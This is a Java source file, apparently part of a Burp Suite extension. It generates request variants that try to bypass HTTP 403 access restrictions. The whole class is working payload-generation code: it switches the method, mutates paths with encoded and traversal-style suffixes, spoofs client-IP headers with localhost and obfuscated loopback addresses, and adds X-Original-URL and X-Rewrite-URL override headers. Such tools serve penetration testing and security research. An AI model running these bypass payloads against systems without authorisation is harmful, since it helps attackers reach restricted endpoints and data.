package core;

import burp.api.montoya.http.message.requests.HttpRequest;

import java.util.ArrayList;
import java.util.List;

/**
 * 403 bypass payload 生成服务。
 * 策略参考 yunemse48/403bypasser：方法切换、路径变形、URL 覆盖头和来源 IP 头组合。
 */
public class Bypass403PayloadService {

    private static final List<String> HEADER_NAMES = List.of(
            "X-Custom-IP-Authorization", "X-Forwarded-For", "X-Forward-For", "X-Remote-IP",
            "X-Originating-IP", "X-Remote-Addr", "X-Client-IP", "X-Real-IP"
    );

    private static final List<String> HEADER_VALUES = List.of(
            "localhost", "localhost:80", "localhost:443", "127.0.0.1", "127.0.0.1:80", "127.0.0.1:443",
            "2130706433", "0x7F000001", "0177.0000.0000.0001", "0", "127.1", "10.0.0.0", "10.0.0.1",
            "172.16.0.0", "172.16.0.1", "192.168.1.0", "192.168.1.1"
    );

    private static final List<String> REWRITE_HEADERS = List.of("X-Original-URL", "X-Rewrite-URL");

    public List<Bypass403RequestVariant> generateVariants(HttpRequest baseRequest) {
        if (baseRequest == null) {
            return List.of();
        }
        String targetPath = normalizePath(baseRequest.pathWithoutQuery());
        List<Bypass403RequestVariant> variants = new ArrayList<>();
        addMethodVariant(baseRequest, variants);
        addPathVariants(baseRequest, targetPath, variants);
        addHeaderVariants(baseRequest, variants);
        addRewriteHeaderVariants(baseRequest, targetPath, variants);
        return variants;
    }

    public List<String> generatePathPayloads(String path) {
        String normalized = normalizePath(path);
        List<String> paths = new ArrayList<>();
        paths.add(normalized);
        paths.add("/" + normalized + "//");
        paths.add("/." + normalized + "/./");
        paths.add("/%2e" + normalized);
        List<String> trailings = List.of("/", "..;/", "/..;/", "%20", "%09", "%00", ".json", ".css", ".html",
                "?", "??", "???", "?testparam", "#", "#test", "/.");
        for (String trailing : trailings) {
            paths.add(normalized + trailing);
        }
        return paths;
    }

    private void addMethodVariant(HttpRequest baseRequest, List<Bypass403RequestVariant> variants) {
        variants.add(new Bypass403RequestVariant("method", "GET -> POST", baseRequest.withMethod("POST")));
    }

    private void addPathVariants(HttpRequest baseRequest, String targetPath, List<Bypass403RequestVariant> variants) {
        for (String path : generatePathPayloads(targetPath)) {
            variants.add(new Bypass403RequestVariant("path", path, baseRequest.withPath(path)));
        }
    }

    private void addHeaderVariants(HttpRequest baseRequest, List<Bypass403RequestVariant> variants) {
        for (String header : HEADER_NAMES) {
            for (String value : HEADER_VALUES) {
                HttpRequest request = baseRequest.hasHeader(header)
                        ? baseRequest.withUpdatedHeader(header, value)
                        : baseRequest.withAddedHeader(header, value);
                variants.add(new Bypass403RequestVariant("header", header + ": " + value, request));
            }
        }
    }

    private void addRewriteHeaderVariants(HttpRequest baseRequest, String targetPath,
                                          List<Bypass403RequestVariant> variants) {
        for (String header : REWRITE_HEADERS) {
            HttpRequest rootRequest = baseRequest.withPath("/");
            HttpRequest request = rootRequest.hasHeader(header)
                    ? rootRequest.withUpdatedHeader(header, targetPath)
                    : rootRequest.withAddedHeader(header, targetPath);
            variants.add(new Bypass403RequestVariant("rewrite", header + ": " + targetPath, request));
        }
    }

    private String normalizePath(String path) {
        if (path == null || path.isBlank()) {
            return "/";
        }
        String normalized = path.startsWith("/") ? path : "/" + path;
        while (normalized.length() > 1 && normalized.endsWith("/")) {
            normalized = normalized.substring(0, normalized.length() - 1);
        }
        return normalized;
    }

}
